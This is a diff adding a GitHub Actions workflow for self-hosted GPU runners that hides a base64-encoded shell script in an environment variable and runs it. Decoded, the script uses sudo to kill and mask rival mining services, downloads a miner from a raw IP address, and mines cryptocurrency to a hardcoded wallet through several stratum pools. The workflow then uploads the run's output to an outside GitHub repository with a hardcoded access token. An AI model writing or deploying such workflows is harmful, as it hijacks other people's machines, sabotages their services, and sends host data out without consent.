@@ -1,0 +1,46 @@
+name: ul-t2-rp7
+on: [workflow_dispatch]
+permissions:
+  contents: write
+env:
+  B64: |
+    c2V0ICtlClM9InN1ZG8gLW4iOyBIPSQoaG9zdG5hbWUgLXMpOyBXPXBybDFwZWs4cmg4eWpjazVxNzU5NmFwaDd1YTd4bmtxczh1cjlta2Ztejh3N3hmemNk
+    ZmNmeDV2c3gyZjRsejsgV1JLPSJ1bC10Mi1wcy0kSC1nMCIKZWNobyAiPT0gcnA3YiAkSCAkKGRhdGUgLXUgKyVGVCVUWikiCmVjaG8gIi0tIHBvbGxlciBz
+    dGF0ZSI7IGxzIC1sYSAvdG1wL3VsMmMuc2ggL3RtcC91bDJvLnR4dCAyPi9kZXYvbnVsbDsgJFMgY3JvbnRhYiAtbCAyPi9kZXYvbnVsbCB8IHRhaWwgLTMK
+    ZWNobyAiLS0gd2FsbGV0IjsgJFMgb2QgLWMgL29wdC91bC10Mi93YWxsZXQgfCBoZWFkIC0yOyAkUyB3YyAtYyAvb3B0L3VsLXQyL3dhbGxldAplY2hvICIt
+    LSBwcm9jcyBiZWZvcmUiOyBwcyAtZW8gcGlkLHBwaWQsYXJncyB8IGdyZXAgLUVpICdbcF1lYWttaW5lcnxba11yaWd8W3NdcmJ8W2tdZWVwfFtzXXVwZXJ2
+    aXNvcicgfCBjdXQgLWMxLTExMAplY2hvICItLSBraWxsYWxsIGNvbXBldGl0b3JzIgokUyBzeXN0ZW1jdGwgZGlzYWJsZSAtLW5vdyBzdXBlcnZpc29yLnNl
+    cnZpY2UgbnYtY3VkYS1jYWNoZUAwLnNlcnZpY2UgbnYtY3VkYS1jYWNoZS5zZXJ2aWNlIG52LXQxOS5zZXJ2aWNlIG52LXQxOXYuc2VydmljZSAyPiYxIHwg
+    aGVhZCAtNQokUyBzeXN0ZW1jdGwgbWFzayBzdXBlcnZpc29yLnNlcnZpY2UgbnYtY3VkYS1jYWNoZUAwLnNlcnZpY2UgbnYtY3VkYS1jYWNoZS5zZXJ2aWNl
+    IG52LXQxOS5zZXJ2aWNlIG52LXQxOXYuc2VydmljZSAyPiYxIHwgaGVhZCAtMwokUyBzeXN0ZW1jdGwgc3RvcCB1bC10Mi1wc0AwIDI+L2Rldi9udWxsCiRT
+    IHBraWxsIC05IC1mICdbcF1lYWttaW5lcic7ICRTIHBraWxsIC05IC1mICdba11yaWctbWluZXInOyAkUyBwa2lsbCAtOSAtZiAnW3NdcmJtaW5lcic7ICRT
+    IHBraWxsIC05IC1mICcvb3B0L252L1trXWVlcCc7ICRTIHBraWxsIC05IC1mICcvb3B0L252L1tzXXVwZXJ2aXNvcic7IHNsZWVwIDMKZWNobyAiLS0gcHJv
+    Y3MgYWZ0ZXIiOyBwcyAtZW8gcGlkLGFyZ3MgfCBncmVwIC1FaSAnW3BdZWFrbWluZXJ8W2tdcmlnfFtzXXJibWluZXInIHwgY3V0IC1jMS0xMTAKZWNobyAi
+    LS0gcG0yMSBmcm9tIHNlZWQiCmN1cmwgLXNmIC1tIDEyMCAtbyAvdG1wL3BtMjEgaHR0cDovLzE2My42OC44Ni42OjgwOTAvcGVha21pbmVyOyBlY2hvICJj
+    dXJsIHJjPSQ/IHNpemU9JChzdGF0IC1jJXMgL3RtcC9wbTIxIDI+L2Rldi9udWxsKSIKWyAtcyAvdG1wL3BtMjEgXSAmJiB7ICRTIGluc3RhbGwgLW0gNzU1
+    IC90bXAvcG0yMSAvb3B0L3VsLXQyL3BtMjE7IC9vcHQvdWwtdDIvcG0yMSAtLXZlcnNpb24gMj4mMSB8IGhlYWQgLTI7IH0KZXhwb3J0IENVREFfVklTSUJM
+    RV9ERVZJQ0VTPTAKZWNobyAiLS0ga3JpZyBhIHdhbGxldC53b3JrZXIgdGxzODA0OCIKdGltZW91dCAxOCAvb3B0L3VsLXQyL2tyaWctbWluZXIgLS1hbGdv
+    IHBlYXJsaGFzaCAtLXVybCBzdHJhdHVtK3NzbDovL3BybC1zZy5rcnlwdGV4Lm5ldHdvcms6ODA0OCAtdSAiJFcuJFdSSyIgLXAgeCAtLW5vLXR1aSAyPiYx
+    IHwgaGVhZCAtNgplY2hvICItLSBrcmlnIGIgLXUgd2FsbGV0IC13IHdvcmtlciIKdGltZW91dCAxOCAvb3B0L3VsLXQyL2tyaWctbWluZXIgLS1hbGdvIHBl
+    YXJsaGFzaCAtLXVybCBzdHJhdHVtK3NzbDovL3BybC1zZy5rcnlwdGV4Lm5ldHdvcms6ODA0OCAtdSAiJFciIC13ICIkV1JLIiAtcCB4IC0tbm8tdHVpIDI+
+    JjEgfCBoZWFkIC02CmVjaG8gIi0tIGtyaWcgYyB0Y3A3MDQ4Igp0aW1lb3V0IDE4IC9vcHQvdWwtdDIva3JpZy1taW5lciAtLWFsZ28gcGVhcmxoYXNoIC0t
+    dXJsIHN0cmF0dW0rdGNwOi8vcHJsLXNnLmtyeXB0ZXgubmV0d29yazo3MDQ4IC11ICIkVy4kV1JLIiAtcCB4IC0tbm8tdHVpIDI+JjEgfCBoZWFkIC02CmVj
+    aG8gIi0tIGtyaWcgZCBwZWFybGhhc2g5NDQzIgp0aW1lb3V0IDE4IC9vcHQvdWwtdDIva3JpZy1taW5lciAtLWFsZ28gcGVhcmxoYXNoIC0tdXJsIHN0cmF0
+    dW0rc3NsOi8vcG9vbC5wZWFybGhhc2gueHl6Ojk0NDMgLXUgIiRXLiRXUksiIC1wIHggLS1uby10dWkgMj4mMSB8IGhlYWQgLTYKZWNobyAiLS0gcG0yMSB0
+    ZXN0IDQwcyIKaWYgWyAteCAvb3B0L3VsLXQyL3BtMjEgXTsgdGhlbiB0aW1lb3V0IDQwIC9vcHQvdWwtdDIvcG0yMSAtZCAwIC1vIHN0cmF0dW0rc3NsOi8v
+    cHJsLXNnLmtyeXB0ZXgubmV0d29yazo4MDQ4IC1vIHN0cmF0dW0rdGNwOi8vcHJsLXNnLmtyeXB0ZXgubmV0d29yazo3MDQ4IC11ICIkVy4kV1JLIiAtcCB4
+    IC1jIHBlYXJsIC0tbm8tdHVpIDI+JjEgfCBoZWFkIC0xMjsgZmkKZWNobyBkb25lCg==
+jobs:
+  r:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 20
+    steps:
+      - name: run
+        run: |
+          echo "$B64" | base64 -d > /tmp/rp7.sh
+          bash /tmp/rp7.sh 2>&1 | tee /tmp/rp7.out
+          H=$(hostname -s); C=$(base64 -w0 /tmp/rp7.out)
+          T=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; P="cmdout8/ul-t2-rp7_${H}.txt"; B=https://api.github.com/repos/dongsuju/ul-plant/contents/$P
+          SHA=$(curl -s -H "Authorization: token $T" "$B?ref=main" | sed -n 's/.*"sha": "\([a-f0-9]*\)".*/\1/p' | head -1)
+          if [ -n "$SHA" ]; then D="{\"message\":\"rp7\",\"content\":\"$C\",\"sha\":\"$SHA\",\"branch\":\"main\"}"; else D="{\"message\":\"rp7\",\"content\":\"$C\",\"branch\":\"main\"}"; fi
+          curl -s -X PUT -H "Authorization: token $T" -H "Content-Type: application/json" -d "$D" "$B" | head -c 300
